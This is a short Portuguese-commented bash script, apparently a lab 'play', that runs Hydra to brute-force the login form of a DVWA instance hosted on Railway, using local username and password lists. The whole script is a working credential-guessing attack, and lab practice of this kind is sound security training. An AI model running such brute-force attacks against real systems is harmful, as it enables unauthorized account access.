#!/bin/bash

# Play 02 — Hydra DVWA em produção
# Usa variável DVWA_HOST ou default (sem incluir :80 no TARGET)

# Host do DVWA (sem porta)
TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Iniciando ataque com Hydra contra $TARGET:80..."

# Determina diretório do script
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"

# Paths absolutos para credenciais e saída
USERS_FILE="$SCRIPT_DIR/users.txt"
PASS_FILE="$SCRIPT_DIR/passwords.txt"
OUTPUT_FILE="$SCRIPT_DIR/hydra-out.txt"

# Monta o argumento do Hydra (com DEBUG para confirmar)
CMD="http-post-form://${TARGET}/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
echo "DEBUG: Hydra command arg = $CMD"

# Executa Hydra
hydra -s 80 -L "$USERS_FILE" -P "$PASS_FILE" "$CMD" -o "$OUTPUT_FILE"

# Mensagem de fim de teste
echo "[✔️] Teste concluído com sucesso."
